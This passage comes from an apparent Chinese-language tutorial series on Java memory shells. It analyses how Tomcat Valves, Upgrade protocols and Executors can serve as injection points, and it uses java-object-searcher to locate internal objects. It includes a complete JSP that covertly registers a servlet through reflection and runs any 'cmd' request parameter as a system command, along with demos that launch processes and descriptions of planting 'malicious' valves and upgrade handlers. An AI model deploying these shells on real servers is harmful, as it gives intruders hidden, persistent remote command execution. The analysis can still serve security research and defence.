然后把生成的这个java-object-searcher-0.1.0.jar放到我们的WebFluxMemoryShellDemo项目的Project Structure中的Libraries中： 然后我们把我们的GreetingFilter.java的代码修改成下面的： 123456789101112131415161718192021222324252627282930313233343536373839package org.example.webfluxmemoryshelldemo.hello;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.stereotype.Component;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.server.WebFilter;import org.springframework.web.server.WebFilterChain;import org.springframework.web.util.pattern.PathPattern;import org.springframework.web.util.pattern.PathPatternParser;import reactor.core.publisher.Mono;import me.gv7.tools.josearcher.entity.Blacklist;import me.gv7.tools.josearcher.entity.Keyword;import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;import java.util.ArrayList;import java.util.List;@Componentpublic class GreetingFilter implements WebFilter { @Override public Mono&lt;Void&gt; filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) { PathPattern pattern=new PathPatternParser().parse(&quot;/hello/**&quot;); ServerHttpRequest request=serverWebExchange.getRequest(); if (pattern.matches(request.getPath().pathWithinApplication())){ System.out.println(&quot;hello, this is our GreetingFilter!&quot;); } List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;(); keys.add(new Keyword.Builder().setField_type(&quot;DefaultWebFilterChain&quot;).build()); List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;(); blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build()); SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); searcher.setBlacklists(blacklists); searcher.setIs_debug(true); searcher.setMax_search_depth(10); searcher.setReport_save_path(&quot;D:\\\\javaSecEnv\\\\apache-tomcat-9.0.85\\\\bin&quot;); searcher.searchObject(); return webFilterChain.filter(serverWebExchange); }} 这里我们设置的关键字是DefaultWebFilterChain，然后直接运行： 也就是说，位置是在： 1234567891011TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} ---&gt; group = {java.lang.ThreadGroup} ---&gt; threads = {class [Ljava.lang.Thread;} ---&gt; [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} ---&gt; this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} ---&gt; handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} ---&gt; httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} ---&gt; delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} ---&gt; delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} ---&gt; delegate = {org.springframework.web.server.handler.FilteringWebHandler} ---&gt; chain = {org.springframework.web.server.handler.DefaultWebFilterChain} 2.13 Tomcat Valve介绍与运行过程分析2.13.1 Valve与Pipeline在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家： https://www.cnblogs.com/coldridgeValley/p/5816414.html 这里我组合引用原文，做了适当的修改，概括一下： tomcat中的Container有4种，分别是Engine、Host、Context和Wrapper，这4个Container的实现类分别是StandardEngine、StandardHost、StandardContext和StandardWrapper。4种容器的关系是包含关系，Engine包含Host，Host包含Context，Context包含Wrapper，Wrapper则代表最基础的一个Servlet。tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。而Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的呢？ 原来，当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件，跟pipeline相关的还有个也是容器内部的组件，叫做valve组件。 Pipeline的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，Pipeline和Valve关系也是一样的。Valve代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把Pipeline比作公路的话，那么Valve可以理解为公路上的收费站，车代表Pipeline中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。 在Catalina中，4种容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve，这个Valve我们称之为BaseValve，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。 Pipeline定义对应的接口Pipeline，标准实现了StandardPipeline。Valve定义对应的接口Valve，抽象实现类ValveBase，4个容器对应基础阀门分别是StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。在实际运行中，Pipeline和Valve运行机制如下图： 这张图是新加坡的Dennis Jacob在ApacheCON Asia 2022上的演讲《Extending Valves in Tomcat》中的PPT中的图片，pdf链接如下： https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf 这篇演讲的录屏在Youtube上面可以找到： https://www.youtube.com/watch?v=Jmw-d0kyZ_4 2.13.2 编写一个简单Tomcat Valve的demo由于在Tomcat环境下使用Valve还要配置web.xml，我嫌麻烦，于是直接使用SpringBoot来搭建。记得这里勾选的是Spring Web： 然后创建test目录并在test目录下创建两个文件，TestValve.java： 1234567891011121314151617package org.example.valvememoryshelldemo.test;import java.io.IOException;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.Response;import org.apache.catalina.valves.ValveBase;import org.springframework.stereotype.Component;@Componentpublic class TestValve extends ValveBase { @Override public void invoke(Request request, Response response) throws IOException { response.setContentType(&quot;text/plain&quot;); response.setCharacterEncoding(&quot;UTF-8&quot;); response.getWriter().write(&quot;Valve 被成功调用&quot;); }} 还有TestConfig.java： 12345678910111213141516171819202122package org.example.valvememoryshelldemo.test;import org.apache.catalina.Valve;import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;import org.springframework.boot.web.server.WebServerFactoryCustomizer;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class TestConfig { @Bean public WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; tomcatCustomizer() { return factory -&gt; { factory.addContextValves(getTestValve()); }; } @Bean public Valve getTestValve() { return new TestValve(); }} 运行效果如下： 2.13.3 Tomcat Valve打入内存马思路分析我们通常情况下用的都是ValveBase，点进这个ValveBase，可以看到是实现了Valve接口： 点进valve可以看到该接口代码如下，这里我加上了注释： 1234567891011121314151617181920package org.apache.catalina;import java.io.IOException;import javax.servlet.ServletException;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.Response;public interface Valve { // 获取下一个阀门 public Valve getNext(); // 设置下一个阀门 public void setNext(Valve valve); // 后台执行逻辑，主要在类加载上下文中使用到 public void backgroundProcess(); // 执行业务逻辑 public void invoke(Request request, Response response) throws IOException, ServletException; // 是否异步执行 public boolean isAsyncSupported();} 接下来就是调试看看这个valve的运行流程了，我们在invoke函数这里下断点调试： 我们看向左下角，看看之前调用到的invoke方法： 在StandardHostValve.java中，代码为： 1context.getPipeline().getFirst().invoke(request, response); 在StandardEngineValve.java中，代码为： 1host.getPipeline().getFirst().invoke(request, response); 之后的诸如Http11Processor.java和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的Tomcat Servlet/Filter/Listener内存马的思路来看，我们需要通过某种方式添加我们自己的恶意valve。 我们去掉之前打的断点，在StandardHostValve.java这里打上断电并重新调试： 然后step into： 鼠标左键单击这里的getPipeline即可进入到所调用的函数实现的位置： 再Ctrl+H进入Pipeline接口，可以看到是有个addValve方法： 这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在addValve函数处Ctrl+H找继承该接口的类，可可以看到是在org.apache.catalina.core.StandardPipeline中： 但是问题就来了，我们无法直接获取到这个StandardPipeline，而我们能直接获取到的是StandardContext，那就去看看StandardContext.java中有没有获取StandardPipeline的方法。 一眼就能看到我们的老熟人——getPipeline方法： 那这样以来我们的思路就可以补充完整了，先反射获取StandardContext，然后编写一个恶意Valve，最后通过StandardContext.getPipeline().addValve()添加就可以了。当然，我们也可以反射获取StandardPipeline，然后再addValve，这样也是可以的。 2.14 Tomcat Upgrade介绍与打入内存马思路分析2.14.1 编写一个简单的Tomcat Upgrade的demo2.14.1.1 利用SpringBoot搭建我这里在之前的Tomcat Valve项目的基础上做了简单的修改，删除之前test目录下的TestValve.java，新建一个TestUpgrade.java： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package org.example.valvememoryshelldemo.test;import org.apache.coyote.*;import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;import org.apache.tomcat.util.net.SocketWrapperBase;import org.springframework.context.annotation.Configuration;import java.lang.reflect.Field;import java.nio.ByteBuffer;@Configurationpublic class TestUpgrade implements UpgradeProtocol { @Override public String getHttpUpgradeName(boolean b) { return &quot;hello&quot;; } @Override public byte[] getAlpnIdentifier() { return new byte[0]; } @Override public String getAlpnName() { return null; } @Override public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) { return null; } @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter, Request request) { return null; } public boolean accept(org.apache.coyote.Request request) { try { Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); Response resp = (Response) response.get(request); resp.doWrite(ByteBuffer.wrap(&quot;\\n\\nHello, this my test Upgrade!\\n\\n&quot;.getBytes())); } catch (Exception ignored) {} return false; }} 然后修改TestConfig.java如下： 12345678910111213141516package org.example.valvememoryshelldemo.test;import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;import org.springframework.boot.web.server.WebServerFactoryCustomizer;import org.springframework.stereotype.Component;@Componentpublic class TestConfig implements WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; { @Override public void customize(TomcatServletWebServerFactory factory) { factory.addConnectorCustomizers(connector -&gt; { connector.addUpgradeProtocol(new TestUpgrade()); }); }} 运行之后命令行执行命令curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080，效果如下： 2.14.1.2 利用Tomcat搭建当然也是可以利用Tomcat来搭建的，只需要TestUpgrade.java即可，因为里面含有定义的servlet逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Request;import org.apache.coyote.Adapter;import org.apache.coyote.Processor;import org.apache.coyote.UpgradeProtocol;import org.apache.coyote.Response;import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;import org.apache.tomcat.util.net.SocketWrapperBase;import java.lang.reflect.Field;import java.nio.ByteBuffer;@WebServlet(&quot;/evil&quot;)public class TestUpgrade extends HttpServlet { static class MyUpgrade implements UpgradeProtocol { @Override public String getHttpUpgradeName(boolean b) { return null; } @Override public byte[] getAlpnIdentifier() { return new byte[0]; } @Override public String getAlpnName() { return null; } @Override public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) { return null; } @Override public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) { return null; } @Override public boolean accept(org.apache.coyote.Request request) { try { Field response = org.apache.coyote.Request.class.getDeclaredField(&quot;response&quot;); response.setAccessible(true); Response resp = (Response) response.get(request); resp.doWrite(ByteBuffer.wrap(&quot;Hello, this my test Upgrade!&quot;.getBytes())); } catch (Exception ignored) {} return false; } } @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { try { RequestFacade rf = (RequestFacade) req; Field requestField = RequestFacade.class.getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); Request request1 = (Request) requestField.get(rf); new MyUpgrade().accept(request1.getCoyoteRequest()); } catch (Exception ignored) {} }} 效果如下： 2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析这部分主要参考了Sndav师傅的文章（原文地址为https://tttang.com/archive/1709/，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/）以及p4d0rn师傅的文章（https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade）。 和之前所提到的Spring Interceptor型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的Filter包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到Filter这一步之前就得打入内存马。 这里，我引用码哥字节文章（https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09）里面的一张Tomcat架构图： 可以清楚地看到，在此之前还有Executor和Processor两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。 这一部分需要更加完备的Tomcat的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好： https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09 其实在之前学习Tomcat Valve的过程中，当时我是一步步step over跟完了所有的代码的，我当时也提了一嘴Http11Processor。我们还是以当时的项目为例来看。 我们还是在StandardHostValve.java的这行打上断点： 从上面我红色箭头所指出的地方就可以看到调用到了process函数，具体调用位置位于org.apache.coyote.AbstractProcessorLight#process，我们跟过去看看： 可以看到，如果当前SocketWrapperBase的状态是OPEN_READ的时候，才会调用对应的processor去处理（第二张图的process调用的位置可以通过第一张图左下角的那个process的后一个process点进去看到）： 我们继续step into这里的service方法看看： 继续step over，可以看到这里在检查header中的Connection头中是否为upgrade，这一点可以通过step into这个isConnectionToken方法看到： 之后干两件事情：一是调用getUpgradeProtocol方法根据upgradedName从httpUpgradeProtocols拿到UpgradeProtocol；二是调用UpgradeProtocol对象的accept方法： 到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的UpgradeProtocol，然后把它插入到httpUpgradeProtocols。 由于httpUpgradeProtocols是一个hashmap，那么向里面添加的话用到的肯定是put方法，直接搜httpUpgradeProtocols.put： 我们在这行打上断点，然后调试，发现在我们没有执行curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080这条命令之前，断点就到了，也就是说，httpUpgradeProtocols.put这个事情是发生在tomcat启动的时候的。 那这样一来，思路就更加具体了一点：反射找到httpUpgradeProtocols，把恶意upgradeProtocol插入进去即可构成upgrade内存马，思路和之前是一模一样的。 那现在只需要解决最后一个问题——如何找到httpUpgradeProtocols的位置。我们打开之前用tomcat搭建的Tomcat Upgrade的demo，在如下位置打下断点，然后执行命令curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080/evil进入断点调试：： step over一步即可在下方看到request1属性： 然后在request1里面的connector的protocolHandler里面发现了httpUpgradeProtocols： 接下来就是一步步地反射了。 2.15 Tomcat Executor内存马介绍与打入内存马思路分析2.15.1新建一个项目，配置好tomcat运行环境和web目录，然后新建以下两个文件，第一个是TestExecutor.java： 1234567891011121314151617181920212223package org.example;import java.io.IOException;import java.util.concurrent.SynchronousQueue;import java.util.concurrent.ThreadPoolExecutor;import java.util.concurrent.TimeUnit;public class TestExecutor extends ThreadPoolExecutor { public TestExecutor() { super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;&gt;()); } @Override public void execute(Runnable command) { try { Runtime.getRuntime().exec(&quot;calc.exe&quot;); } catch (IOException e) { throw new RuntimeException(e); } super.execute(command); }} 第二个是TestServlet.java： 123456789101112131415161718package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@WebServlet(&quot;/test&quot;)public class TestServlet extends HttpServlet { TestExecutor executor = new TestExecutor(); @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { executor.execute(() -&gt; { System.out.println(&quot;Execute method triggered by accessing /test&quot;); }); }} 然后访问浏览器对应context下的test路由： 2.15.2 Tomcat Executor内存马介绍与代码调试分析在2.14.2节中，我们聊到过可以在Executor模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇： https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor https://cjlusec.ldxk.edu.cn/2023/02/15/Executor/ https://xz.aliyun.com/t/11593 https://xz.aliyun.com/t/11613 在我之前提到过的讲tomcat架构的基础文章（https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09），有详细地讲述ProtocolHandler组件中的EndPoint部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用： 2.15.2.1 Endpoint五大组件如下表所示： 组件 描述 LimitLatch 连接控制器，控制最大连接数 Acceptor 接收新连接并返回给Poller的Channel对象 Poller 监控Channel状态，类似于NIO中的Selector SocketProcessor 封装的任务类，处理连接的具体操作 Executor Tomcat自定义线程池，用于执行任务类 2.15.2.2 Endpoint分类EndPoint接口的具体实现类为AbstractEndpoint，AbstractEndpoint具体的实现类有AprEndpoint、Nio2Endpoint、NioEndpoint： Endpoint 简要解释 Tomcat 源码位置 AprEndpoint 使用APR模式解决异步IO问题，提高性能 org.apache.tomcat.util.net.AprEndpoint Nio2Endpoint 使用代码实现异步IO org.apache.tomcat.util.net.Nio2Endpoint NioEndpoint 使用Java NIO实现非阻塞IO org.apache.tomcat.util.net.NioEndpoint 上面所提到的tomcat，指的是如下pom依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-coyote&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt;&lt;/dependency&gt; Tomcat默认启动是以NioEndpoint来启动的，它是Tomcat中默认的负责使用NIO方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给Processor进行后续的处理。 2.15.2.3 Executor相关代码分析点开Executor.java即可看到有一个execute方法： Ctrl+Alt+F7追踪即可看到这个Executor接口在AbstractEndpoint这个抽象类中有相关实现： 在AbstractEndpoint.java中搜索executor，往下翻即可看到有setExecutor和getExecutor这两个函数： 查看getExecutor函数的调用位置，发现就在该文件中有一个关键调用： 跟过去： 从下面这篇文章中我们可以知道processSocket在Tomcat运行过程中的作用： https://blog.51cto.com/u_8958931/2817418 那此时我们就有一个想法，如果我能控制executor，我把原来的executor通过setExecutor变成我恶意创建的executor，然后再通过这后面的executor.execute（org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)）一执行就可以加载我们的恶意逻辑了。 但是现在有一个很头疼的问题，那就是标准的ServletRequest需要经过Adapter的封装后才可获得，这里还在Endpoint阶段，其后面封装的ServletRequest和ServletResponse无法直接获取。 那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触java-object-researcher的时候，c0ny1师傅写的这篇文章： http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/ 那就试试看呗，我们导入jar包到项目之后修改TestServlet.java代码如下： 123456789101112131415161718192021222324252627282930313233package org.example;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import me.gv7.tools.josearcher.entity.Blacklist;import me.gv7.tools.josearcher.entity.Keyword;import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;import java.util.ArrayList;import java.util.List;@WebServlet(&quot;/test&quot;)public class TestServlet extends HttpServlet { TestExecutor executor = new TestExecutor(); @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) { executor.execute(() -&gt; { System.out.println(&quot;Execute method triggered by accessing /test&quot;); }); List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;(); keys.add(new Keyword.Builder().setField_type(&quot;request&quot;).build()); List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;(); blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build()); SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys); searcher.setBlacklists(blacklists); searcher.setIs_debug(true); searcher.setMax_search_depth(10); searcher.setReport_save_path(&quot;D:\\\\javaSecEnv\\\\apache-tomcat-9.0.85\\\\bin&quot;); searcher.searchObject(); }} 接着访问路由，然后在控制台输出中搜索request = ： 直接搜索到了这条链： 1234567891011TargetObject = {org.apache.tomcat.util.threads.TaskThread} ---&gt; group = {java.lang.ThreadGroup} ---&gt; threads = {class [Ljava.lang.Thread;} ---&gt; [15] = {java.lang.Thread} ---&gt; target = {org.apache.tomcat.util.net.NioEndpoint$Poller} ---&gt; this$0 = {org.apache.tomcat.util.net.NioEndpoint} ---&gt; connections = {java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;} ---&gt; [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} ---&gt; socket = {org.apache.tomcat.util.net.NioChannel} ---&gt; appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} ---&gt; request = {org.apache.coyote.Request} 我们来验证一下，在org/apache/tomcat/util/net/NioEndpoint.java的这里下断点，不断step over，就可以找到这里的request的位置： 点开这里的byteBuffer，可以看到它是一个字节数组，右键找到View as ... String即可变成字符串： 再点击上面我指出来的View Text即可清楚看到具体内容： 这就意味着我们可以把命令作为header的一部分传入，再把结果作为header的一部分传出即可。 三、传统Web型内存马3.1 Servlet内存马3.1.1 简单的servlet内存马demo编写根据我们在上面的2.3节中的分析可以得出以下结论： 如果我们想要写一个Servlet内存马，需要经过以下步骤： 找到StandardContext 继承并编写一个恶意servlet 创建Wapper对象 设置Servlet的LoadOnStartUp的值 设置Servlet的Name 设置Servlet对应的Class 将Servlet添加到context的children中 将url路径和servlet类做映射 由以上结论我们可以写出如下内存马demo： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.Servlet&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletConfig&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletContext&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletRequest&quot; %&gt;&lt;%@ page import=&quot;javax.servlet.ServletResponse&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;% try { ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); String servletURL = &quot;/&quot; + getRandomString(); String servletName = &quot;Servlet&quot; + getRandomString(); Servlet servlet = new Servlet() { @Override public void init(ServletConfig servletConfig) {} @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException { String cmd = servletRequest.getParameter(&quot;cmd&quot;); { InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } }; Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(servletName); wrapper.setServlet(servlet); wrapper.setServletClass(servlet.getClass().getName()); wrapper.setLoadOnStartup(1); standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(servletURL, servletName); response.getWriter().write(&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; + servletURL + &quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot; + servletName + &quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot; + servletURL + &quot;?cmd=echo 世界，你好！&quot;); } catch (Exception e) { String errorMessage = e.getMessage(); response.setCharacterEncoding(&quot;UTF-8&quot;); PrintWriter outError = response.getWriter(); outError.println(&quot;Error: &quot; + errorMessage); outError.flush(); outError.close(); }%&gt;&lt;/body&gt;&lt;/html&gt;&lt;%! private String getRandomString() { String characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; StringBuilder randomString = new StringBuilder(); for (int i = 0; i &lt; 8; i++) { int index = (int) (Math.random() * characters.length()); randomString.append(characters.charAt(index)); } return randomString.toString(); }%&gt; 访问，执行任意命令： 3.1.2 servlet内存马demo代码分析先完成第一个任务：找到StandardContext，代码如下： 1234567ServletContext servletContext = request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 首先得知道Field是什么。在Java中，Field这个类属于java.lang.reflect包，用于表示类的成员变量（字段）。Field类提供了访问和操作类的字段的方法，包括获取字段的名称、类型、修饰符等信息，以及在实例上获取或设置字段的值。这样我们就可以实现在运行时动态获取类的信息，绕过一些访问修饰符的限制，访问和操作类的私有成员。 所以上述代码的含义就是：从当前HttpServletRequest中获取ServletContext对象，然后使用反射机制获取ServletContext类中名为context的私有字段，并赋值给Field类型的变量appctx，把这个变量的属性设置为可访问，这样我们后续可以通过反射获取它的值。接着通过反射获取ServletContext对象的私有字段context的值，并将其强制类型转换为ApplicationContext。接下来继续使用反射机制获取ApplicationContext类中名为context的私有字段，并赋值给Field类型的变量stdctx，同样将其设置为可访问；最后通过反射获取ApplicationContext对象的私有字段context的值，并将其强制类型转换为StandardContext，到这里，我们就成功找到了StandardContext。 接着完成第二个任务：继承并编写一个恶意servlet，代码如下： 1234567891011121314151617181920212223242526272829Servlet servlet = new Servlet() { @Override public void init(ServletConfig servletConfig) {} @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException { String cmd = servletRequest.getParameter(&quot;cmd&quot;); { InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } } @Override public String getServletInfo() { return null; } @Override public void destroy() { }}; 可以看到，除了service代码之外，我们还编写了init、getServletConfig、getServletInfo和destroy方法，可是它们并没有用到，要么返回null，要么直接留空不写，那我们为什么还要写这四个方法呢？ 那我们就来试试看注释掉之后会怎么样： 报错：Class 'Anonymous class derived from Servlet' must implement abstract method 'init(ServletConfig)' in 'Servlet'。 我们直接跟进Servlet类，可以看到其是一个接口： 原来，在Java中，接口中的方法默认都是抽象的，除非在Java 8及以后的版本中使用了默认方法。并且，如果一个类实现了某个接口，那么它必须提供该接口中所有抽象方法的具体实现，这就是我们必须要写出上述四个方法的原因。 这里我使用cmd /c来实现可以执行带有空格的命令，例如我在3.1.1中举例的echo 世界，你好！；对于Linux系统，那就是/bin/sh -c；接着就是关于输入或者返回结果中带有中文的情况的处理，我们需要设置编码为GBK即可，当然这个就需要具体情况具体对待了。 接着我们需要完成后续的六个任务：创建Wapper对象、设置Servlet的LoadOnStartUp的值、设置Servlet的Name、设置Servlet对应的Class、将Servlet添加到context的children中、将url路径和servlet类做映射，代码如下： 1234567Wrapper wrapper = standardContext.createWrapper();wrapper.setName(servletName);wrapper.setServlet(servlet);wrapper.setServletClass(servlet.getClass().getName());wrapper.setLoadOnStartup(1);standardContext.addChild(wrapper);standardContext.addServletMappingDecoded(servletURL, servletName); 前面几步在之前已经讲过了，这个standardContext.addChild(wrapper);是为了让我们自定义的servlet成为Web应用程序的一部分；然后standardContext.addServletMappingDecoded(servletURL, servletName);也可以写成如下形式： 123// 要引入：&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationServletRegistration&quot; %&gt;ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);dynamic.addMapping(servletURL); 3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解请参考Skay师傅和yzddmr6师傅的文章，他们写的非常详细，这里直接贴出链接： https://yzddmr6.com/posts/tomcat-context/ https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew 引用Skay师傅的一句话总结： 